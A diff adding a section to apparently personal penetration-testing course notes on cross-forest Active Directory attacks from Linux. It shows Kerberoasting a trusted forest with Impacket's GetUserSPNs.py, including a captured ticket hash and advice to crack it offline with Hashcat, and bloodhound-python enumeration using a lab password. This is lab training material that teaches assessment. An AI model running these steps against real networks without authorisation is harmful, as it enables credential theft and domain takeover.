@@ -8,6 +8,16 @@
       - [Using Get-DomainForeignGroupMember](#using-get-domainforeigngroupmember)
       - [Accessing DC03 Using Enter-PSSession](#accessing-dc03-using-enter-pssession)
     - [SID History Abuse - Cross Forest](#sid-history-abuse---cross-forest)
+  - [Cross-Forest Trust Attacks - from Linux](#cross-forest-trust-attacks---from-linux)
+    - [Cross-Forest Kerberoasting](#cross-forest-kerberoasting-1)
+      - [Using GetUserSPNs.py](#using-getuserspnspy)
+      - [Using the -request Flag](#using-the--request-flag)
+    - [Hunting Foreign Group Membership with BloodHound-python](#hunting-foreign-group-membership-with-bloodhound-python)
+      - [Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf](#adding-inlanefreightlocal-information-to-etcresolvconf)
+      - [Running bloodhound-python against INLANEFREIGHT.LOCAL](#running-bloodhound-python-against-inlanefreightlocal)
+      - [Compressing the File with zip -r](#compressing-the-file-with-zip--r)
+      - [Repeating these Steps for FREIGHTLOGISTICS.LOCAL](#repeating-these-steps-for-freightlogisticslocal)
+      - [Viewing Dangerous Rights through BloodHound](#viewing-dangerous-rights-through-bloodhound)
 
 ---
 
@@ -137,3 +147,131 @@ SID History can also be abused across a forest trust. If a user is migrated from
 
 ![ad cross-forest attacks 1](../../../../images/ad_cross_forest_attacks1.png)
 
+## Cross-Forest Trust Attacks - from Linux
+
+### Cross-Forest Kerberoasting
+
+#### Using GetUserSPNs.py
+
+```bash
+d41y@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
+```
+
+#### Using the -request Flag
+
+Rerunning the command with the ```-request``` flag added gives you the TGS ticket. You could also add ```-outputfile <OUTPUT_FILE>``` to output directly into a file that you could then turn around and run Hashcat against.
+
+```bash
+d41y@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
+
+
+$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
+```
+
+You could then attempt to crack this offline using Hashcat mode 131000. If successful, you'd be able to authenticate into the FREIGHTLOGISTICS.LOCAL domain as a Domain Admin. If you are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in your current domain and if it suffers from password re-use. This could be a quick win for you if you have not yet been able to escalate in your current domain. Even if you already have control over the current domain, it would be wort adding a finding to your report if you do find password re-use across similarly named accounts in different domains.
+
+### Hunting Foreign Group Membership with BloodHound-python
+
+You may, from time to time, see users or admins from one domain as members of a group in another domain. Since only Domain Local Groups allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in Administrator group in Domain B when dealing with a bidirectional forest trust relationship. If you are testing from a Linux host, you can gather this information by using the Python implementation of BloodHound. You can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.
+
+#### Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
+
+On some assessments, your client may provision a VM for you that gets an IP from DHCP and is configured to use the internal domain's DNS. You will be on an attack host without DNS configured in other instances. In this case, you would need to edit your resolv.conf file to run this tool since it requires a DNS hostname for the target DC instead of an IP address. You can edit the file as follows using sudo rights. Here you have commented out the current nameserver entries and added the domain name and the IP address of ACADEMY-EA-DC01 as the nameserver.
+
+```bash
+d41y@htb[/htb]$ cat /etc/resolv.conf 
+
+# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+# 127.0.0.53 is the systemd-resolved stub resolver.
+# run "resolvectl status" to see details about the actual nameservers.
+
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+```
+
+#### Running bloodhound-python against INLANEFREIGHT.LOCAL
+
+Once this is in place, you can run the tool against the target domain as follows:
+
+```bash
+d41y@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+
+INFO: Found AD domain: inlanefreight.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01
+INFO: Found 1 domains
+INFO: Found 2 domains in the forest
+INFO: Found 559 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01
+INFO: Found 2950 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
+INFO: Found 183 groups
+INFO: Found 2 trusts
+
+<SNIP>
+```
+
+#### Compressing the File with zip -r
+
+You can compress the resultant zip files to upload one single zip file directly into the BloodHound GUI.
+
+```bash
+d41y@htb[/htb]$ zip -r ilfreight_bh.zip *.json
+
+  adding: 20220329140127_computers.json (deflated 99%)
+  adding: 20220329140127_domains.json (deflated 82%)
+  adding: 20220329140127_groups.json (deflated 97%)
+  adding: 20220329140127_users.json (deflated 98%)
+```
+
+#### Repeating these Steps for FREIGHTLOGISTICS.LOCAL
+
+```bash
+d41y@htb[/htb]$ cat /etc/resolv.conf 
+
+# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+# 127.0.0.53 is the systemd-resolved stub resolver.
+# run "resolvectl status" to see details about the actual nameservers.
+
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain FREIGHTLOGISTICS.LOCAL
+nameserver 172.16.5.238
+
+d41y@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+
+INFO: Found AD domain: freightlogistics.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 5 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
+INFO: Found 9 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
+INFO: Found 52 groups
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 10 workers
+```
+
+#### Viewing Dangerous Rights through BloodHound
+
+After uploading the second set of data, you can click on "Users with Foreign Domain Group Membership" under the "Analysis" tab and select the source domain as INLANEFREIGHT.LOCAL. Here, you will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTIC.LOCAL domain.
+
+![ad cross-forest attacks 2](../../../../images/ad_cross_forest_attacks2.png)
